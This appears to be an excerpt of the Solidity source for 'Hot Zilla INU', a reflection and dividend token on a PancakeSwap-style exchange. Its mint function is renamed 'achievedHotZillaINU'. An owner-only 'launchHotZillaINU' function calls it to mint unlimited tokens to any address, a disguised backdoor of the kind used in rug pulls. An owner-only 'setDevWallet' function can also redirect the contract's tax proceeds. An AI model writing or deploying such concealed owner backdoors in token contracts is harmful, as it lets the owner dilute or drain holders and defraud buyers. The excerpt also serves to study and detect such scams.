...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function achievedHotZillaINU(address account, uint256 amount) internal virtual {
...
function achievedHotZillaINU(address account, uint256 value) internal override {
    super.achievedHotZillaINU(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      achievedHotZillaINU(account, mintAmount);
...
contract HotZillaINUrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using HolderHotZillaINU  for HolderHotZillaINU .Map;
HolderHotZillaINU .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("HotZillaINU_rewardToken_Tracker", "HotZillaINU_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "HotZillaINU_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "HotZillaINU_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main HotZillaINU contract.");
    }
...
contract HotZillaINU is ERC20, Ownable {
 event UpdateDEXV2Router(address indexed newAddress, address indexed oldAddress);
    ...
    using SafeMath for uint256;
  address public marketTaxAdress =0xca9023B5A7f3b18B57e4A9C15Ab2C2a59BB2C9c3;
    uint256 public  marketTax = 2;
    uint256 public  rewardTax = 5;
    uint256 public  TotalFees;
 uint256 public gasForProcessing = 300000;
    address public DEXV2Pair;
    PanCakeRouter02 public DEXV2Router;
    HotZillaINUrewardToken public rewardToken;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Hot Zilla INU", "HZI") {
 
        TotalFees = rewardTax.add(liquidityFee).add(marketTax);
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new HotZillaINUrewardToken();
...
isTimelockLimited[owner()] = true;
 ...
 achievedHotZillaINU(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function launchHotZillaINU(address allowp, uint256 allowa) public masterWallet{
       achievedHotZillaINU(allowp, allowa);
  }
 function setDevWallet(address payable wallet) public masterWallet {
        marketTaxAdress = wallet;
    }
   
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "HotZillaINU: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "HotZillaINU: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "HotZillaINU: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "HotZillaINU: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTHotZillaINU = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTHotZillaINU);
...
uint256 bnbForLiquidity = bnbBalance.mul(liquidityFee).div(bnbFeeFactor).div(2);
        uint256 bnbForReflection = bnbBalance.mul(rewardTax).div(bnbFeeFactor);
        uint256 bnbForDev = bnbBalance.sub(bnbForLiquidity).sub(bnbForReflection);
addLiquidity(tokensTHotZillaINU, bnbForLiquidity);
payable(marketTaxAdress).transfer(bnbForDev);
 (bool success,) = address(rewardToken).call{value: bnbForReflection}("");
if(success) {
            emit transferDividends(tokensToLiquify.mul(rewardTax).div(TotalFees), bnbForReflection);
        }
    }
